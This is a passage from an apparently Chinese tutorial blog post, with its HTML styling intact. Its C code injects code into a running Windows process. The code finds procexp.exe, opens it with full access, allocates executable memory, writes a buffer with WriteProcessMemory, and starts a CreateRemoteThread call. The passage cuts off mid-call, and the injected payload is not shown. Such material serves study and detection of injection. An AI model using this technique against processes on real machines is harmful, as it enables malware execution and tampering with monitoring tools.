style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    pe32</span><span style="color: rgb(51, 51, 51);">.</span><span style="color: rgb(51, 51, 51);">dwSize </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(167, 29, 93);">sizeof</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">PROCESSENTRY32</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//查看第一个进程</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    BOOL bRet </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">Process32First</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">hSnap</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">&amp;</span><span style="color: rgb(51, 51, 51);">pe32</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(167, 29, 93);">while</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">bRet</span><span style="color: rgb(51, 51, 51);">)</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(51, 51, 51);">{</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        bRet </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">Process32Next</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">hSnap</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">&amp;</span><span style="color: rgb(51, 51, 51);">pe32</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(167, 29, 93);">if</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">wcscmp</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">pe32</span><span style="color: rgb(51, 51, 51);">.</span><span style="color: rgb(51, 51, 51);">szExeFile</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> L</span><span style="color: rgb(24, 54, 145);">"procexp.exe"</span><span style="color: rgb(51, 51, 51);">)</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">==</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">){</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">            pid </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> pe32</span><span style="color: rgb(51, 51, 51);">.</span><span style="color: rgb(51, 51, 51);">th32ProcessID</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">            </span><span style="color: rgb(167, 29, 93);">break</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(51, 51, 51);">}</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(51, 51, 51);">}</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//获取进程句柄</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    HANDLE hProcess </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">OpenProcess</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">PROCESS_ALL_ACCESS</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> FALSE</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> pid</span><span style="color: rgb(51, 51, 51);">);</span></span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">就是昨天的代码，然后再来开辟一个空间</p><section class="code-snippet__github" style="margin: 10px 8px;height: auto;display: flex;font-size:12px;line-height:32px;;background-color: rgba(27, 31, 35, 0.05);color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;text-align: start;white-space: normal;"><pre data-lang="" style="padding: 1em;display: grid;counter-reset: line 0;overflow-x: auto;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//1.在目标进程开辟空间</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    LPVOID lpAddr </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">VirtualAllocEx</span><span style="color: rgb(51, 51, 51);">(</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        hProcess</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//在目标进程中开辟空间</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        NULL</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//表示任意地址，随机分配</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(0, 134, 179);">1</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//内存通常是以分页为单位来给空间 1页=4k 4096字节</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        MEM_COMMIT</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//告诉操作系统给分配一块内存</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        PAGE_EXECUTE_READWRITE</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(167, 29, 93);">if</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">lpAddr </span><span style="color: rgb(51, 51, 51);">==</span><span style="color: rgb(51, 51, 51);"> NULL</span><span style="color: rgb(51, 51, 51);">){</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        printf</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(24, 54, 145);">"Alloc error!"</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(167, 29, 93);">return</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(51, 51, 51);">}</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后我们就是要写入,这里就不能使用memcpy了因为这个是当前进程调用的&nbsp;<strong style="color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><span style="font-style: italic;">WriteProcessMemory</span></strong></p><section class="code-snippet__github" style="margin: 10px 8px;height: auto;display: flex;font-size:12px;line-height:32px;;background-color: rgba(27, 31, 35, 0.05);color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;text-align: start;white-space: normal;"><pre data-lang="" style="padding: 1em;display: grid;counter-reset: line 0;overflow-x: auto;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">BOOL </span><span style="color: rgb(0, 134, 179);">WriteProcessMemory</span><span style="color: rgb(51, 51, 51);">(</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  HANDLE hProcess</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">                </span><span style="color: rgb(150, 152, 150);">// handle to process</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  LPVOID lpBaseAddress</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">           </span><span style="color: rgb(150, 152, 150);">// base of memory area</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  LPCVOID lpBuffer</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">               </span><span style="color: rgb(150, 152, 150);">// data buffer</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  SIZE_T nSize</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">                   </span><span style="color: rgb(150, 152, 150);">// count of bytes to write</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  SIZE_T </span><span style="color: rgb(51, 51, 51);">*</span><span style="color: rgb(51, 51, 51);"> lpNumberOfBytesWritten </span><span style="color: rgb(150, 152, 150);">// count of bytes written);</span></span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里我们就写入进去</p><section class="code-snippet__github" style="margin: 10px 8px;height: auto;display: flex;font-size:12px;line-height:32px;;background-color: rgba(27, 31, 35, 0.05);color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;text-align: start;white-space: normal;"><pre data-lang="" style="padding: 1em;display: grid;counter-reset: line 0;overflow-x: auto;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//2.在目标进程中写入代码</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    bRet </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">WriteProcessMemory</span><span style="color: rgb(51, 51, 51);">(</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        hProcess</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//目标进程</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        lpAddr</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//目标地址    目标进程中</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        data</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//源数据    当前进程中</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(167, 29, 93);">sizeof</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">data</span><span style="color: rgb(51, 51, 51);">),</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//写多大</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(51, 51, 51);">&amp;</span><span style="color: rgb(51, 51, 51);">dwWritesBytes </span><span style="color: rgb(150, 152, 150);">//成功写入的字节数</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(167, 29, 93);">if</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">(!</span><span style="color: rgb(51, 51, 51);">bRet</span><span style="color: rgb(51, 51, 51);">){</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(0, 134, 179);">VirtualFreeEx</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">hProcess</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> lpAddr</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">1</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> MEM_DECOMMIT</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(167, 29, 93);">return</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(51, 51, 51);">}</span></span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">写进去了还要调用才能执行,创建远程线程&nbsp;<strong style="color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><span style="font-style: italic;">CreateRemoteThread</span></strong></p><section class="code-snippet__github" style="margin: 10px 8px;height: auto;display: flex;font-size:12px;line-height:32px;;background-color: rgba(27, 31, 35, 0.05);color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;text-align: start;white-space: normal;"><pre data-lang="" style="padding: 1em;display: grid;counter-reset: line 0;overflow-x: auto;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">HANDLE </span><span style="color: rgb(0, 134, 179);">CreateRemoteThread</span><span style="color: rgb(51, 51, 51);">(</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  HANDLE hProcess</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">                          </span><span style="color: rgb(150, 152, 150);">// handle to process</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  LPSECURITY_ATTRIBUTES lpThreadAttributes</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(150, 152, 150);">// SD</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  SIZE_T dwStackSize</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">                       </span><span style="color: rgb(150, 152, 150);">// initial stack size</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  LPTHREAD_START_ROUTINE lpStartAddress</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">// thread function</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  LPVOID lpParameter</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">                       </span><span style="color: rgb(150, 152, 150);">// thread argument</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  DWORD dwCreationFlags</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">                    </span><span style="color: rgb(150, 152, 150);">// creation option</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  LPDWORD lpThreadId                        </span><span style="color: rgb(150, 152, 150);">// thread identifier);</span></span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">返回目标进程的线程</p><section class="code-snippet__github" style="margin: 10px 8px;height: auto;display: flex;font-size:12px;line-height:32px;;background-color: rgba(27, 31, 35, 0.05);color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;text-align: start;white-space: normal;"><pre data-lang="" style="padding: 1em;display: grid;counter-reset: line 0;overflow-x: auto;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">//3.向目标程序调用一个线程 创建远程线程  执行写入代码</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    HANDLE hRemoteThread </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">CreateRemoteThread</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">hProcess</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//目标进程</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        NULL</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: 